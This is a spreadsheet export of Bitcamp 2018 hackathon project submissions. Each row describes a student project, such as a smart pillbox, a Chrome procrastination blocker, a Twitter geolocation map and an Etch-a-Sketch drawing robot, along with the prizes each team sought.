Submission Title,Submission Url,Plain Description,Website,Desired Prizes,"Does Your Hack Need To Stay At Your Current Table? (I.E. Hardware, Vr/Ar Hacks). If So, What Table Number Are You At?",...,,
Anarchypedia,http://bitcamp2018.devpost.com/submissions/92175-anarchypedia,"Inspiration

Everyone has, at some point, tried and failed to edit a Wikipedia article. There's a reason not just anyone can make changes - or else anarchy would ensue, right? Well... hmmm ....

What it does

Anarchypedia allows users to anonymously view, edit and save Wikipedia articles.

How I built it

Anarchypedia is a simple CRUD (or, rather, CRU) web app built with Django on the back end. When a user searches for a previously non-Anarchypedia-ed article, the article's original content is queried from the Wikipedia API in XML. The main body (not including subheaders) of the article is then extracted from the XML as raw HTML and saved into the database with other relevant metadata. The user is then presented with the article.
When editing an article, the user is manipulating the HTML saved from earlier (I would've liked to have the user edit in WikiCode or some other markup language, but then I'd end up parsing HTML with regex).

Challenges I ran into


Matching Wikipedia's styling and fonts was a pain
Deploying this app was a pain


Accomplishments that I'm proud of


Managed to finish minimum viable product by the end of night 1 and go Maryland sightseeing :)


What I learned


Parsing  XML with Python
Django 2.0
Deploying with PythonAnywhere


What's next for Anarchypedia

What's next is a laundry list of polishing:


Random anarchy-ed article link on sidebar
Search bar on base template
Match fonts and styling more closely
Responsive design
Fetch/Save full Wikipedia articles instead of only main content
Full edit history tracking

",http://anarchypedia.org,"Best Domain Name - Domain.com, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",,,,
Becorum - Robust Universal Mobility App,http://bitcamp2018.devpost.com/submissions/92182-becorum-robust-universal-mobility-app,"Inspiration

A smarter way to travel and connect user to robust, organized and universal mobility throughout the US.

What it does

It's an android app that gives user the ability to purchase local bus passes in app, using NFC to manage cashless payments, making it easier across the board to get from point A to point B without the worry of a paper pass.

The app also determines the cheapest and most efficient travel routes for users.

How I built it

Android Studio, Java, XML, MongoDB

Challenges I ran into

We ran into installs and overcoming the learning curve of Android Studio.

What's next for Becorum

Continue as a startup project.
",https://github.com/ShannonCanTech/BitcampBecorum,"Best Domain Name - Domain.com, Most Futuristic Hack - Paypal, Best Financial Hack - Capital One, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",R4,,,
Slionel Messi,http://bitcamp2018.devpost.com/submissions/92207-slionel-messi,"Slime Soccer bot made with OpenAI gym
",https://github.com/keller-mark/slime-soccer-bot,"Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",,,,
ScheduLit,http://bitcamp2018.devpost.com/submissions/92229-schedulit,"Inspiration

What inspired our team to make ScheduLit was our work schedule as students. We often find ourselves with so many deadlines to meet, but with no clue how to partition our time efficiently. Which assignments have the highest priority? Will I get everything done in time? How will I meet multiple deadlines? These are all questions that ScheduLit answers.

The creation of ScheduLit stems from the common dilemma of having to schedule tasks, and not quite knowing if your schedule will allow you to complete all the tasks you set out to accomplish. By solving this problem, we're taking some of the stress out of figuring out what to work on, and from there, helping people get their work accomplished faster.

What it does

ScheduLit is a Google Chrome extension that allows users to input a list of tasks, which will then be organized into the most optimal schedule through the implementation of a greedy algorithm. The input consists of the task name and deadline, the estimated number of hours required to complete the task, and the user�۪s preference for the task (on a scale from 1-10).

From there, we seed our greedy AI with our temporary starting schedule, and it then populates a new calendar with the best schedule. The schedule adheres to the most regular intervals of working hours while honoring limitations like sleep schedules, inactive hours, and permanent events that are already on the calendar. 

Our greedy heuristics factor in how early the tasks are completed in relation to the deadline, the preference to complete a task, and how variant the task blocks are listed. For instance, a long task spread out over the course of a few days is better than a long task that is completed all in one day.

How we built it

The technologies we used to create ScheduLit include vanilla JavaScript, the Google Calendar API, and a Python to JavaScript transpiler called ���Transcrypt.�۝
    First, we discussed our vision for the project and the features we wanted. Then, we split up the work by having one front-end developer, two back-end developers, and one full-stack developer. We occasionally checked in with each other and used Git to ensure that we were all on the same page. Finally, we reconvened to combine the frontend and backend.

Challenges we ran into

The challenges we encountered were both individual and team-based.

Our team had very little experience in front-end development, and as a result, our front-end developer had to do a considerable amount of research before she could start stylizing the extension and implementing user input.

Our back-end developers were not familiar with JavaScript at all, and as such resorted to Python. However, Google Chrome extensions are only compatible with JavaScript code, so the back-end developers researched ways to implement, or at least convert, python to javascript code. Luckily, they found a way, by using Transcrypt to transcompile the code. We ran into troubles when dealing with converting our Python�۪s heapq library, so we ended up having to create our own.

Our back-end developers also had a rough time determining the starting states for our heuristic, as well as what greedy algorithms to run in order to optimize trade-offs between efficiency and accuracy.

Our full-stack developer faced challenges in dealing with Google Calendars. The recommended google cloud API is incompatible with Chrome Extensions due to security constraints, so he had to make the HTTP requests manually.

Accomplishments that we're proud of

We are proud, first of all, that we completed our first hack together. We have two members of our team who are doing their first hack, and their motivation to stick through the weekend is something we are extremely proud of.

We are also proud that we were able to find solutions to most of the problems we hit, such as finding the transcompiling software, or our full-stack developer configuring the GET and POST requests manually for the HTTP header when he realized that Google Calendars hate Chrome Extensions.

What we learned

We learned about the importance of task delegation and communication. While splitting up tasks between team members can accomplish a lot, it can also be confusing. There were some elements on the front end, such as the structure of the user�۪s input, that were handled differently on the back end. As a result, we learned that we needed to keep each other notified of our progress.

We also learned that preparation is important. When we came into this hackathon, we had an idea picked out, but not necessarily which tools we needed. Oddly, the default Google API for JavaScript is incompatible with Chrome Extensions due to security requirements, knowing this would have saved hours of time Similarly, if we had known that we had to use JavaScript, we might have been able to prepare and spend more time on development.

We also learned that it's okay if we don't know how to do something, because Google's always got our back. Thanks, Google.

What's next for ScheduLit

What's next for us is diving deeper into the User Interface for ScheduLit. We'd like to have a sleeker UI, with more options in the settings for inactive hours, preferred tasks over others, and pre-set tasks to include in our calendar. We would also like to improve the efficiency of the algorithm behind the scenes so that we can process a large number of tasks more quickly. After this extension is implemented, we'd like to explore making this into an actual calendar app. Combining our efforts with other CS students passionate about efficient scheduling, we are going to create a fantastic Calendar AI that will plan your week with no thought on your part.
",https://github.com/Andrewjeska/autoscheduler,"Most Futuristic Hack - Paypal, Best Hack (be passionate) - Facebook","We will be able to move around. D7 if we're at the assigned table, though.",rzehrung,,
PillBug: The Smarter PillBox,http://bitcamp2018.devpost.com/submissions/92264-pillbug-the-smarter-pillbox,"Inspiration

When brainstorming for hackathon ideas, we all wanted to create a product or service that would be helpful to many people. While there are countless hacks aimed towards millennials, we wanted to take this hackathon as an opportunity to create a useful hack for the elderly. One of our team members recalled a scary incident where his grandfather overdosed on medication after forgetting that he already took the medicine. The grandfather was taken to the ER as a result. Thankfully, while no permanent damage happened to grandpa, his grandson really want to create a product to prevent this from happening again. Meet - the smart pillbox.

What it does

The pillbox keeps caretakers up-to-date with the status of their patient's pillbox. The pillbox would monitor the pillbox on a minute-by-minute basis to check for anomalies. The pillbox talks to a backend server which talks to a mobile app that is easily accessible by caretakers. If the pillbox detects anything that is off, the mobile app would notify the caretaker so immediate action can be taken. This allows caretakers to ensure that their patient don't forget to take their pills or don't overdose on any pills. 

How we built it

To check the status of a pillbox, a raspberry pi and a camera is positioned over the 2x7 pillbox via a stand and captures images of said pillbox. We knew that in real-life situations the amount of lighting (and thus shadows) over the box can be arbitrary and less than ideal, so we accounted for that to make our computer vision model robust. Through k-means clustering algorithm, we were able to identify which buckets of the pillbox had pills or were empty. This information is then sent to our backend hosted on MongoDB Stitch. After some processing, we utilize SparkPost to inform caretakers via text or email (if requested) and then we update the virtual view of the pillbox in our Android mobile application. Via our mobile app, caretakers would have the real-time status of the pillbox and can also access the medicine intake history of said patient.

Challenges we ran into

Getting MongoDB Stitch and Sparkpost to work. Developing the computer vision model to recognize the pills inside the cells. Taking the UI to the next level. Working against the clock.

Accomplishments that we're proud of

We were able to split our strengths and bring together many different technologies for this project. Two of our team members worked with opencv and hardware to get the computer vision model working and robust. Our third member developed the backend and APIs, and our last member developed the Android mobile app.

What we learned

Focus on developing the MVP given the time constraints. Bringing your own hardware can be super helpful for a hackware hack.

What's next for PillBug: The Smarter PillBox

What's next for PillBug is a rotatable camera that to capture images of nearby surrounding. We also want to add LED lights to the pillbox to better interact with our patients.
",https://github.com/anthonyc1/pillbug,"Best use of SparkPost API - SparkPost, Most Futuristic Hack - Paypal, Best Use of MongoDB Stitch - MongoDB, Most Unique Hack - 1517 Fund, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",,tejashah88,aspitalny,
Schedule Helper,http://bitcamp2018.devpost.com/submissions/92265-schedule-helper,"Inspiration

When creating a schedule, numeric reviews sometimes aren't enough when effectively gauging what to expect from a certain professor. We wanted to simplify the process of making a perfect schedule by gathering more available data across the web.

What it does

Our course builder accesses UMD students' written reviews for their professors, from various rating websites, and condenses that information into an easy-to-use schedule guide that takes into account what students are saying about each professor.

How we built it

We create the algorithm to understand how ""positive"" a student's review is in python. From there, we were able to scrape data from the web and create a python-based web app using the Django framework to bring everything together.

Challenges we ran into

We had many issues to tackle when it came to scraping reviews off the web correctly, developing a working algorithm for gauging student responses, and finally visualizing that data on the web application. Eventually, we were able to pull through and overcome each challenge with some last-minute changes.

Accomplishments that we're proud of

We are extremely proud that our project was able to finally work in the end, and that the data it was reading was accurately being used to do what we initially intended it to.

What we learned

We learned a lot about the web development practice, including what resources are needed and how to put it all together. We especially learned all the many factors that come into constructing an ideal algorithm that takes into account efficiency, scalability, and also accuracy.

What's next for Schedule Helper

We definitely want to improve performance time, update the web application appearances, and add more functionality, especially adding more visual data, the ability to add/remove courses dynamically, and improving user navigation through the website.
",https://github.com/adamwang97/Schedule-Helper,,,,,
Sheng-Ke (The Tabletop Card Game),http://bitcamp2018.devpost.com/submissions/92269-sheng-ke-the-tabletop-card-game,"Inspiration

Unsure what to do at Bitcamp, I quickly made a friend who introduced me to a single-player, Japanese card game that is based on the player appreciating the dynamics of nature. Inspired by the ancient game's beautiful art, I began cutting out equal sized sheets of paper and drawing scenes on them whose art-style was reminiscent of the game's. I eventually decided to turn these sheets of paper into a card game, and based them off the Japanese cycles of creation and destruction. After some play testing, I finally designed a working, fun -to-play prototype of an easy-to-pick-up game.

What it does

It gives you and your friends something to do, while challenging your logical thinking and encouraging you to score more than your opponents while still having casual fun.

How I built it

I drew the original art on pieces of paper before xeroxing them and formatting them onto a Word document with Microsoft Paint. I printed and cut the sheets out by hand.

Challenges I ran into

The original version of the game was fairly redundant with an unbalanced point economy. I overcame this obstacle by flagging down other hackers to beta-test the game with me.

Accomplishments that I'm proud of

Creating such a fun-to-play game in such a short time.

What I learned

How accomplishing it feels to know that you made a new game that can bring people together.

What's next for Sheng-Ke (The Tabletop Card Game)

I am going to print the cards on better card stock and assemble a team of skilled artists to turn the game into an official product. I will have a printing company produce the cards and packaging and sell them at local tabletop gaming shops to other passionate and casual gamers.
",,"Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",No,,,
Meme Relief,http://bitcamp2018.devpost.com/submissions/92270-meme-relief,"Inspiration

All of us being the spiciest of meme connoisseurs, wanted a way to stop ourselves from seeing overused memes while casually browsing the internet.  Although the original basis for this project did not have practical applications, we found that this software tool could be utilized by teachers or employers to increase productivity in the workplaces and schools by preventing employees/students from seeing the majority of inappropriate images.

What it does

We specifically made the software to block all spongebob memes with a model made with microsoft custom vision. Microsoft custom vision works by prompting the user to submit pictures (either unlabeled or having the user label them his or herself), teaching itself which important concepts to use when classifying images, and finally tag images with successful classifcations.

Our software framework sits on top of this computer vision model and creates an array of all images on a web page before vetting each one through the specifically-trained custom vision tool. If the tool identifies an image as being a SpongeBob meme with a high degree of certainty, the tool replaces the image with an image the user selects before the program starts running. In this specific instance, our tool replaces SpongeBob memes with an image of a guitar playing gentleman riding a cumulus cloud.

How we built it

We built this Google Chrome Extension with JavaScript and HTML to demonstrate how certain images that a user trains Microsoft's custom vision with can be replaced with other images. 

Challenges we ran into

As of right now, the model occasionally incorrectly identifies a normal picture as a SpongeBob meme. Further image training could make the model very accurate, but no amount of training could ever make the system 100% accurate. However, this isn't the problem the tool is trying to solve. The tool was designed in mind of the fact that a 100% image filtration is an unrealistic ideal. It aims to prevent the majority of unproductive images (chosen by the user) from being seen and it accomplishes this within tolerance.

Accomplishments that we're proud of

What we learned

We are incredibly proud of our team of mostly beginners being able to code and implement a tool that works hand in hand with a computer vision API from Microsoft for our first time working together.  This accomplishment is even more impressive when one realizes that our team was originally set on creating a music game and then pivoted half-way through the second work day to create Meme Relief.

What's next for Meme Relief

We learned how to build applications that use computer vision API's. We learned about the Fourier Transformation and sound packet collection. Many of us figured out how to use Unity for the first time. One learned how to use MS Paint as a professional artist as well.     
",https://github.com/agathaturya/freaky-phobias,"Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",,ajiroun96,rchoe67,
Testudo Course Monitor,http://bitcamp2018.devpost.com/submissions/92273-testudo-course-monitor,"Testudo Course Monitor

One of the most stressful parts of the semester for undergraduate students at most universities is the process of registering for classes. The uncertainties of not knowing whether or not you can get the schedule that you want can be very nerve-wracking and can add unnecessary stress on an already overstressed student. This project should help students better prepare for their registration.

This is a web scraper for the University of Maryland Schedule of Classes that gathers information about course professor, section, and available seats relative to total number of seats. While there are several applications that can check how many seats are available in a certain class at any given point in time, the data about the rate at which seats are taken is not stored from semester to semester. The web scraper stores the data on a daily basis and is ultimately able to plot as a function of time, the number of available seats in a certain section of a class. 

In the future, the web scraper should be able to make extrapolations and be able to predict whether or not a certain class will be full by a certain date. 
",https://github.com/benjib2214/Testudo,,No,benjib2214,,
To DoGether,http://bitcamp2018.devpost.com/submissions/92274-to-dogether,"Inspiration: I get frustrated doing boring tasks alone when I could be doing them with friends. So what if there was an app that could auto sync tasks such as rating, shopping, and laundry with your friends.

What it does: It is a web app that allows you to add events to a calendar. If multiple people add the same event to the calendar than it adds them to each others events.

How I built it: I used ruby Sinatra as my server on a AWS EC2 VM. I used mongodb as my database.

Challenges I ran into: lack of time, running into bugs

Accomplishments that I'm proud of: I'm proud that I attempted the task, put a lot of effort in, and learned new skills

What I learned: Facebook API, AWS EC2, ruby Sinatra, and mongodb

What's next for To DoGether: finish the app
",http://54.162.19.81:4567,,,,,
TweetMap,http://bitcamp2018.devpost.com/submissions/92276-tweetmap,"Inspiration

I've worked with the Twitter API before and I really enjoy it, there's a lot of interesting data you can get out of it; in the past I've done projects with natural language processing on tweets, but this time I wanted to do something new.

What it does

You enter a word or phrase, and it pulls from the Twitter API to display geolocation data with Esri. You can add as many queries as you want and see them in superposition on the map together to compare.

How I built it

I originally just used plain HTML/Javascript with an express server, but about halfway through the hackathon I decided to upgrade to Angular so I could improve the UI. I also used a Python backend for communicating with Twitter.

Challenges I ran into

The data is sparser than I'd like, turns out people don't tweet with geolocation turned on very often. From a query of 2000 tweets I'll get less than 20 with a location attached. This can be fixed by just getting more tweets, but that also increases the runtime drastically, so I had to try and find a balance.

Accomplishments that I'm proud of

I really like how it turned out altogether, I'm going to put it up on my website later with my other Twitter-based project that I made at the last hackathon I went to.

What I learned

I learned a lot about the Esri API and I really like it, it was perfect for this project.

What's next for TweetMap

I'll put it up on my website, and maybe spruce up the UI a bit.
",https://github.com/r-best/Bitcamp2018-TweetMap,"Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook, Best Hack with Esri APIs and SDKs - Esri",No,,,
Pythagorean Triple Finder,http://bitcamp2018.devpost.com/submissions/92277-pythagorean-triple-finder,"Inspiration

I enjoy math

What it does

finds all pythagorean triples

How I built it

in matlab

Challenges I ran into

making sure the triangles were integers

Accomplishments that I'm proud of

What I learned

What's next for Pythagorean Triple Finder
",,,,,,
Procrastination Station,http://bitcamp2018.devpost.com/submissions/92278-procrastination-station,"Inspiration

As four first time hackers, we met while searching for teams and decided to stick together as mutual beginners. Having never met before hailing from UMBC, UMD, and Nova, we spent time brainstorming a project that was feasible for all of us to complete but would still provide us with a challenge. While combining our want to make a game with the knowledge of a pre-existing app that requires one to answer math questions before one's alarm goes off, we decided to build a chrome extension that does something similar when you try to procrastinate. 

What it does

ProcrastinationStation is a chrome extension that works every time you try to go onto Facebook. It will first redirect you to our website, procrastination-station.com, which forces you to answer 3 math problems within 30 seconds before it redirects you to Facebook. While you're on Facebook, the extension will redirect you to the same page every 60 minutes in an effort to annoy you out of procrastinating and remind you of the work you should be doing.

How we built it

We used glitch.com to collaborate using HTML, CSS, and Javascript to build procrastination-station.com. Simultaneously, we worked to create the chrome extension using Visual Studio Code with files that we collaborated on through glitch.com. Finally, we worked on the graphics for procrastination-station.com using Pixilart.

Challenges we ran into

Since the extent of all of our experiences was Java or less, we all worked hard to implement our knowledge in Java into a completely new language. We honed in on our ability to learn and ask questions and began to understand Javascript with the help from each other and mentors. 

Accomplishments that we're proud of

We worked hard to create our first chrome extension and learn the beginnings of Javascript, a language none of us were previously familiar with.

What we learned

Through having to work with three other brand new team members, we all learned our ability to embrace our own skills and work together as a team. Additionally, through accomplishing this project in just a single weekend, we understood our ability to learn quickly and apply new skills.

What's next for Procrastination Station

We hope that many other University students will use the Procrastination Station extension to deter, if not, prevent them from procrastinating from their studies! 
Also, our future goal is to include other popular social media to the Procrastination Station extension. 
",https://chrome.google.com/webstore/detail/procrastinationstation/iogijohedmhahconojcpdbgedljphkmk?utm_source=gmail,"Best Domain Name - Domain.com, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",n/a,AdaUchendu,akendom,
Represent Me,http://bitcamp2018.devpost.com/submissions/92279-represent-me,"Inspiration

In light of recent elections and the significant lack of voter participation, we became curious about how to get the younger generation (but as old as 25) engaged in politics.

What it does

In this bitcamp we were able to develop three major features:

Billboard - We gathered the top five most trending bills that are getting pushed through congress. On a very public scale and in a way that current legislators can see, we implemented a system for users to give a simplified public opinion on certain bills. Don't worry, if you have a more articulated opinion, the next feature is for you!

Forum - This tool gives you a safe and respectful outlet for your political opinion. We've not only gathered trending bills, but also have included ""hot topic"" pages for the current most controversial topics that people are heated about.

Legislators - We've added a tool in which you can find who represents YOU in both the house of representatives and the senate.

How we built it

The project was divided into three parts, one for each of our team members: web scraping/data collection, Front end, and Back end development. 

Challenges we ran into

Most of us have not built a web application before, therefore we ran into a lot of problems involving asynchronous js functions, promises, and NoSQL querying. Cameron ran into issues involving regular expressions, Akash had a steep learning curve for bootstrap.

Accomplishments that we're proud of

The interface is intuitive, the backend is fully supported with a query-able database, and we had a large collection of reliable data to support our information. 

What we learned

Preparing an idea before hand is the move. 

What's next for demurewolf.github.io

We plan on expanding all of the features mentioned above, while also including a messaging system for authenticated users.
",https://github.com/demurewolf/demurewolf.github.io,"Best use of SparkPost API - SparkPost, Best Use of MongoDB Stitch - MongoDB, Best Hack (be passionate) - Facebook",V1,,,
Ram Bars,http://bitcamp2018.devpost.com/submissions/92280-ram-bars,"We wanted to create one place to go to find the specials and addresses of all the bars in the area instead of visiting their individual websites.
",http://34.239.224.150/,,No,,,
Frankenstein's Monkey,http://bitcamp2018.devpost.com/submissions/92281-frankenstein-s-monkey,"Inspiration

For too long, humans have been unquestioning in the face of death itself. For too long, science has taken a backseat to superstition. That ends today.

What it does

It lives.

How I built it

You don�۪t want to know.

Challenges I ran into

When I had to expand the chest cavity, I struggled to sew and stitch the sections of t-shirt I had cut up into the very small amount of fur. With enough hot glue, I managed to survive.

Accomplishments that I'm proud of

I've done the unthinkable. I'm prouder than words can express.

What I learned

People should not trust me with stuffed animals.

What's next for Frankenstein's Monkey

He will  walk, he will talk, everybody will gawk.
",http://www.franken-monkey.com,"Best Domain Name - Domain.com, Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",Can move if absolutely needed. Would prefer to stay at Table S7.,,,
Char(k)ity,http://bitcamp2018.devpost.com/submissions/92282-char-k-ity,"Inspiration

Often times, stores or banks will allow users to round their transactions up on purchases in order to give to a good cause (for example, a total of $6.84 might round up to $7.00, and the extra 16 cents will be donated to a charity). We wanted to be able to bring the same idea into the cryptocurrency space, particularly on Ark's platform.

What it does

Our application allows users to sign up for Ark wallets. When they create transactions, the amount is rounded up to the next 0.1 of an Ark, and the difference is sent to the public address of a charity of their choice (such as American Red Cross, Purple Heart, or Wounded Warriors). The application also keeps track of their addresses and balances, and normal transactional functionality is built in.

How I built it

We needed 3 main components to build this: a web interface for the wallet, a database to store our users, and the Ark api to handle transactions. For the web interface, we used normal HTML, CSS, and javascript to allow users to interact with their wallet. For the database, we decide to use Google's Firebase, since they have a clean javascript API. With Ark, we used two different javascript APIs, one for generating seeds and addresses for new users, and another for handling transactions and keeping track of balances.

Challenges I ran into

We ran into a few challenges with this application. First, getting set up with the Ark testnet was a bit difficult since my partner and I had not been added to Ark's official slack channel. We had to dig around online for a bit and use Ark's reddit to help get ourselves online, but once we got our testnet wallets set up it was pretty easy to use. Another challenge we ran into was importing Ark's APIs into our application, since we needed to get two distinct Ark javascript libraries working together properly to run the app correctly. We were able to overcome this by bundling and importing the libraries together, with particular attention to the order and dependencies.

Accomplishments that I'm proud of

We're very proud that we were able to develop an application that goes toward a good cause. Rounding up to the nearest 0.1 of an Ark is a small addition to a user's transactions, but if millions of people are doing it, it adds up to a significant amount of money in donations for these charities. We're also proud that we were able to combine these separate technologies and get them to work together to create a new application for Ark's platform.

What I learned

We learned a lot about how to use Ark's API, as well as Ark's general platform and technology. Because we wanted to integrate Ark into our application, we learned a lot about how Ark's testnet works, how their APIs work, how their transactions are structured, and about Ark's purpose in general. Most of our experience had been with other cryptocurrencies, so getting familiar with an entirely new currency was fun and exciting!

What's next for Char(k)ity

For the purposes of our demo, we created a static HTML application, but next steps would be to decouple the app into a functioning front and back end, with the back-end handling all of our users' sensitive data, and the front-end simply acting as an interface. Currently, Ark's APIs only support transactions with single outputs, so users must pay two transaction fees in order to give to charity. Once the API gets updated in the next core version, multiple output transactions will be supported, so we will change the structure of our application to put the normal recipient output and charity output in the same transaction, thereby saving on fees. Lastly, we would also consolidate users' Ark in a few wallets owned by the platform (similar to the way exchanges like Coinbase handle cryptocurrency), and simply update users' account balances, rather than issue each user their own unique address.
",,Decentralise Everything: Blockchain challenge - Ark,,,,
Alexa Startups,http://bitcamp2018.devpost.com/submissions/92283-alexa-startups,"Inspiration

We often hear about this idea of investing in your community, but almost as often we lack a way to truly execute upon such conviction. We were inspired by the idea of giving people a method to discover the types of businesses that are based out of your community and could, as a result, benefit the locale both directly and indirectly.

What it does

The Alexa skill allows you to effortlessly ask your Echo device to search for businesses based on the location specified. It returns the 3 most recently updated results in the CrunchBase database.

How We built it

By contacting CrunchBase and obtaining API keys for their Open Data Map service, we were able to create a service which would interpret the voice commands passed to our server by the Alexa service and then determine the proper way to query the database. Then we would parse the response and provide the Alexa service the proper response. We utilized a database to store queries anonymously for future reference.

Challenges I ran into

There were many issues with getting the API implementation correctly and then there were many issues with properly parsing the JSON returned by the API. We also had issues with JS scoping which often made implementation very slow.

Accomplishments that We're proud of

Creating a fully functional and useful tool at one of our first hackathons. Overcoming challenges that felt insurmountable, like a scoping issue that took hours and even stumped a mentor for almost half an hour.

What We learned

We learned that it's really important to spend the time to set up an efficient development environment because the challenges of working in a messy dev environment where you can't easily debug will exponential cost you more than taking the time to have the best dev environment from the beginning.

What's next for Alexa Startups

To add more ways to search the Crunchbase database that would allow users to find the startups they're looking for.
",,"Best Use of AWS - Amazon Web Services, Best Financial Hack - Capital One, Best Designed Investor Education Product - Finra, Best Use of MongoDB Stitch - MongoDB",,dmizushima19,,
Sketch Ya Later,http://bitcamp2018.devpost.com/submissions/92284-sketch-ya-later,"Inspiration

We've all seen Toy Story, and our favorite part was when Woody dueled the Etch-a-Sketch, Western style. We sought to recreate that experience, but with our own pictures instead!

What it does

A standard image file is processed using Python image processing software, which reduces the picture to a single set of ordered points. This information is sent to an Arduino microcontroller, which uses stepper motors to turn the knobs of the Etch-a-Sketch.

How we built it

Image Processing.

The goal is to have an algorithm that accepts an arbitrary image and produces an etchable path. Images are first converted to grayscale and the canny edges are extracted. These edges are want we want the etch a sketch to draw. However, there is no guarantee that these contours are connected and often are not. To connect them we consider the binary edge image as a graph where black pixels are vertexes and adjacent black pixels share an edge. We then use depth first search to find all the connected components in the image. Starting with an arbitrary component we use A* to find approximate shortest path to the next connected component. We then draw this path, and repeat the process with this new, ""gaint component"" until all components are connected. For the A* heuristic we randomly sample each component in the image, find the closest pair of points (with one point belonging to the giant component), and use distance to the point that does not belong to the giant component as the heuristic. This step was key in making the problem computational feasible. The final step is to use a depth first search to produce a single contour, representing the image we want to draw.

Serial Communication:

Points are sent to the Arduino as a a sequence of two 2B unsigned integers corresponding to x and y coordinates. Because serial port communication can send a maximum of 64B reliably, point packets are capped at quantities of 16 each. A serial connection is established from the computer to the Arduino, and a handshaking procedure ensures that the Arduino has finished processing all points in memory before requesting the next packet.

Stepper Motor Control:

We first had to write our own libraries to control the stepper motors, as the library that comes with the Arduino IDE is blocking, thus prevents simultaneous and independent control of multiple motors. We created a non-blocking class that allowed the issuing of single steps in either direction then created another library which could take a vector (x and y coordinates) for the motors to move by, and synchronize the steps of the two motors to create a line at the proper angle. The library could then be used to move along a stream of points and create a full drawing. To securely attach the motors to the Etch A Sketch, we 3D modeled and 3D printed two sets of gears, one pair which fit snugly over the Etch A Sketch's knobs and one pair which attached to the shaft of the motor. Finally, we had to do all of the wiring necessary to control the motors. 

Challenges we ran into

At first, we just connected each motor to a motor driver, but this drew too much current through the drivers, causing them to overheat and not be able to reliably issue the correct output patterns. When we discovered the issue was excessive current, we switched to controlling each motor with two separate motor drivers, with their input and output controls tied together. This halved the current going through each of the drivers and reduced the heat enough for multiple minutes of uninterrupted drawing time.

Accomplishments that we're proud of

Finishing a hardware hack successfully!

What we learned

Heat is the true enemy

What's next for Sketch Ya Later

Storing processed images on the Arduino's static EEPROM memory to be drawn after processing.
",https://github.com/viruslobster/sketch-ya-later,"Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",L13,mrr2019,,
Gin Rummy Scorekeeper,http://bitcamp2018.devpost.com/submissions/92285-gin-rummy-scorekeeper,"Inspiration

I enjoy playing card games, especially gin rummy. However, I am always frustrated when I can't keep score accurately during the game. The scoring in the game becomes tricky very quickly.

What It Does

This module is designed to make the pain of scoring out of the game. The players still need to understand the rules, but all of the calculations are made based on user inputs about the number of deadwood cards in the player's hand.

How I Built It

I used Python 2.7 to develop this module. It consists of a few functions that are run on loop until one player wins the game. The code also allows user to type in their names to make the module easier to use. 

Challenges I Ran Into

My biggest challenge was saving the new values created by the function onto the global variables so that each round's score could be added to the total score, rather than reverting back to 0 each round. In addition, I had difficulties making sure that the scores were accurate and would follow through the code when expected, such as when bonuses were being calculated for ""gin"" and after-game situations. Another issue I have is how to display the rules of the game, since it contains certain parts of scoring.

Accomplishments That I'm Proud Of

I'm proud to have developed my first Python script from a blank canvas. I also utilized the skills I learned from taking Python classes and lessons into my own script. I am most definitely proud that the program actually functions as expected when inputs are correctly used.

What I Learned

I learned how to design my own functions to make flexible calculations based on user-input, and then creating a loop for that function until user-input requirements are met (when a score matches or exceeds the requested game score value). It gives users flexibility to use this program to play Gin Rummy of different lengths. I want to add a link to rules as well so beginners can learn how to play and refer to it when they use the program.

What's Next for Gin Rummy Scorekeeper?

I would like the program to offer the flexibility to score different types of Gin Rummy, and possibly allow custom rules. I possibly would like this to become an application that can be used on phones and other devices easily so that they don't need Python to run the module.
",https://github.com/99atran/ginrummyscore.git,,No,,,
CryptoPricePredictor-v0.01,http://bitcamp2018.devpost.com/submissions/92286-cryptopricepredictor-v0-01,"Inspiration

we were day trading during the winter break and realized we can automate buying and selling if we have a good strategy 

What it does

it will successfully predict the price trend of a cryptocurrency and automatically buy or sell it

How we built it

we used java to retrieve rest API from the crypto exchanges, then use compute different indicators and store it into SQL database.

Challenges we ran into

Time, communication, project structure learning new skills on the spot.

Accomplishments that we're proud of

successful connected all the parts to produce a prototype  

What we learned.

rest API, different stock indicators, backend server design, database integration.  

What's next for CryptoPricePredictor-v0.01

better UI, more indicators, more efficient database schema and operations, writing an installer, having a dedicated server, multiple points of sources for data collection,  predictive model.
",,"Best Financial Hack - Capital One, Most Unique Hack - 1517 Fund",No,csalaman,,
Third Floor Planning,http://bitcamp2018.devpost.com/submissions/92287-third-floor-planning,"Inspiration

Floor plans are super expensive to have turned into a 3d model, like thousands of dollars.  If you're doing a renovation on your house and are given a pdf you probably want to know what that space will really look like. We can help, fast and cheap.

What it does

upload a pdf or image floor plan, computer vision algorithms run on it, pull out meaningful data and line structures, turn those into a a 3d model in sketchup automatically. export as a model and put it into webvr.

How I built it

OpenCV in python. Ruby api in sketchup. exports to COLLADA for webr in aframe that's compatible with all major headsets.

Challenges I ran into

OpenCV is hard. Sketchup is hard.
",http://keasty.com/,"Best Domain Name - Domain.com, Most Unique Hack - 1517 Fund",,,,
Close Call,http://bitcamp2018.devpost.com/submissions/92289-close-call,"Inspiration

Accidents are scary. They can happen to anyone to anyone at any time, when we least expect. The best we can do is to take measures to better prepare for these situations. Through our potentially life-saving service we hope to offer real-time alert of accidents as they happen to police and emergency care facilities. By dramatically reducing the time needed to contact first responders, we will greatly enhance a victim�۪s chance of survival. CloseCall is an app that�۪s going to look out for you when no one else will.

According to the Association for Safe International Road Travel, over 37,000 people die every year in the United States as a result of road crashes. In addition to individual lives being lost, fatal road accidents place economic burdens on the community- with an average cost of $820 per person or $230.6 billion per year (ASIRT). It is evident, that this is a huge problem that needs a solution. Indeed, this issue is not limited solely to the United States. According to the Annual Global Road Crash Statistics Report provided by ASIRT, an average of 1000 people dies every day in the world, with over 90% of the fatalities occurring in developing worlds. When it comes to life and death, we cannot discriminate against those who have the resources and those who do not. CloseCall is a highly integrated mobile application and full stack web service application that effectively connects victims with police and emergency medical personnel as an accident occurs. 

